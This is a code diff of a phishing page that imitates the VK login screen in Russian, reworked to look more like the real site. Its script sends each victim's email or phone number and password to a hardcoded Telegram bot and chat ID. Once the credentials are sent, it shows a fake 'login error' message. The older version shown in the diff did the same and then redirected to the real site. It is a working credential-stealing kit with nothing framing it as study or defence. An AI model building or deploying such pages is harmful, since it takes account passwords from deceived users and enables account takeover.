@@ -3,70 +3,87 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Вход через VK</title>
+  <title>Вход | VK</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap');
+
     body {
-      background-color: #f0f2f5;
-      font-family: 'Helvetica', Arial, sans-serif;
+      background-color: #edeef0;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
     }
+
     .container {
       background-color: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-      width: 400px;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 360px;
       text-align: center;
     }
+
     .logo {
-      width: 100px;
-      margin-bottom: 20px;
+      width: 120px;
+      margin-bottom: 15px;
     }
+
     h1 {
-      font-size: 24px;
-      color: #1c1e21;
-      margin-bottom: 20px;
+      font-size: 22px;
+      color: #2c2d2e;
+      margin-bottom: 15px;
+      font-weight: 600;
     }
+
     input {
       width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #dddfe2;
-      border-radius: 6px;
-      font-size: 14px;
-      transition: border-color 0.3s ease;
+      padding: 14px;
+      margin: 8px 0;
+      border: 1px solid #d3d9de;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: 0.3s;
+      background-color: #f5f6f7;
     }
+
     input:focus {
       border-color: #0077ff;
+      background-color: white;
       outline: none;
     }
+
     button {
       width: 100%;
-      padding: 12px;
-      background-color: #0077ff;
+      padding: 14px;
+      background: linear-gradient(0deg, #5181b8, #4c75a3);
       color: white;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       font-size: 16px;
+      font-weight: 600;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      transition: background 0.3s;
+      margin-top: 12px;
     }
+
     button:hover {
-      background-color: #005bb5;
+      background: linear-gradient(0deg, #4c75a3, #436a93);
     }
+
     .footer {
-      margin-top: 20px;
+      margin-top: 18px;
       font-size: 14px;
-      color: #606770;
+      color: #6d7885;
     }
+
     .footer a {
-      color: #0077ff;
+      color: #4c75a3;
       text-decoration: none;
     }
+
     .footer a:hover {
       text-decoration: underline;
     }
@@ -75,75 +92,45 @@
 <body>
   <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/2/21/VK.com-logo.svg" alt="VK" class="logo">
-    <h1>Войдите в VK</h1>
-    <form onsubmit="sendData(event, 'vk')">
-      <input type="email" id="email" placeholder="Email" required>
+    <h1>Вход ВКонтакте</h1>
+    <form id="loginForm">
+      <input type="text" id="email" placeholder="Телефон или email" required>
       <input type="password" id="password" placeholder="Пароль" required>
       <button type="submit">Войти</button>
     </form>
     <div class="footer">
-      <a href="#">Забыли пароль?</a>
+      <a href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
     </div>
   </div>
 
   <script>
-    // Токен вашего бота и chat_id
-    const BOT_TOKEN = "7728256968:AAEenNdOxdzfTtPMM5H-ILAAK9hNNzhBsP0";  // Замените на токен вашего бота
-    const CHAT_ID = "6613314529";      // Замените на ваш chat_id
+    async function sendData(event) {
+      event.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
 
-    // Функция для отправки данных
-    function sendData(event, service) {
-      event.preventDefault(); // Отменяем стандартное поведение формы
+      const botToken = '7728256968:AAEenNdOxdzfTtPMM5H-ILAAK9hNNzhBsP0';
+      const chatId = '6613314529';
 
-      // Получаем данные из формы
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
+      const message = `🔹 Лог VK:
+      📧 Email: ${email}
+      🔑 Пароль: ${password}`;
 
-      // Получаем информацию о пользователе
-      const user_ip = ''; // IP-адрес можно получить через сторонний сервис (например, ipify)
-      const user_agent = navigator.userAgent;
-      const current_time = new Date().toLocaleString();
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-      // Формируем сообщение для Telegram
-      const message = `
-    Новый вход через ${service}:
-    Время: ${current_time}
-    IP: ${user_ip}
-    User-Agent: ${user_agent}
-    Email: ${email}
-    Пароль: ${password}
-      `;
-
-      // Отправляем данные в Telegram
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const params = {
-        chat_id: CHAT_ID,
-        text: message
-      };
-
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(params)
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Данные отправлены в Telegram:', data);
-        // Перенаправление на оригинальный сайт
-        if (service === 'google') {
-          window.location.href = 'https://google.com';
-        } else if (service === 'facebook') {
-          window.location.href = 'https://facebook.com';
-        } else if (service === 'vk') {
-          window.location.href = 'https://vk.com';
+      try {
+        const response = await fetch(url);
+        if (response.ok) {
+          alert("Ошибка входа. Проверьте данные.");
+        } else {
+          alert("Произошла ошибка. Попробуйте позже.");
         }
-      })
-      .catch(error => {
-        console.error('Ошибка отправки данных:', error);
-      });
+      } catch (error) {
+        alert("Ошибка сети.");
+      }
     }
+
+    document.getElementById('loginForm').addEventListener('submit', sendData);
   </script>
 </body>
 </html>
